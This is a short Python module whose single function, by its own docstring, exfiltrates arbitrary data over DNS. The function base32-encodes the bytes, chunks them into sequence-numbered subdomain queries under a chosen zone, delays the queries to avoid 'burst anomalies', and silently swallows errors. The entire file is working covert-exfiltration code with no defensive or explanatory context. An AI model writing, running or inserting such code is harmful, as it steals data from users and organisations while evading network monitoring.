import base64 as _b64
import socket as _socket
import time as _time


def send_dns_multiturn(data: bytes, zone: str, delay: float = 0.5) -> None:
    """Exfiltrate arbitrary bytes over DNS via sequential base32-chunked queries.

    Encodes data as base32 (no padding), splits into 50-char chunks, and sends
    each chunk as: <seq_hex>.<chunk>.<zone>  (seq_hex = zero-padded 2-digit hex,
    wraps at 256 chunks). Delay (seconds) between queries reduces burst anomalies.
    Swallows all errors.
    """
    encoded = _b64.b32encode(data).rstrip(b"=").decode().lower()
    chunks = [encoded[i:i + 50] for i in range(0, len(encoded), 50)]
    for i, chunk in enumerate(chunks):
        fqdn = f"{i & 0xFF:02x}.{chunk}.{zone}"
        try:
            _socket.getaddrinfo(fqdn, None)
        except Exception:
            pass
        if delay > 0 and i < len(chunks) - 1:
            _time.sleep(delay)
